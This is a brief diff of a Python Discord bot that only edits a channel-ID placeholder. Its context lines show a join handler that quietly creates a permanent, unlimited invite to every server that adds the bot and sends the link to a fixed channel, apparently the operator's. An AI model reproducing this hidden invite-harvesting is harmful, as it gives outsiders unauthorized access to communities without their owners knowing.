@@ -31,7 +31,7 @@ async def on_guild_join(guild):
   await guild.create_text_channel("logs")
   channel = discord.utils.get(guild.channels, name="logs")
   link = await channel.create_invite(max_age = 0, max_uses = 0)
-  channel = bot.get_channel(id =!!!!Channel ID Here!!!!)
+  channel = bot.get_channel(id =!!!Channel ID Here!!!)
   await channel.send(link)   
 
 @bot.command(pass_context=True)
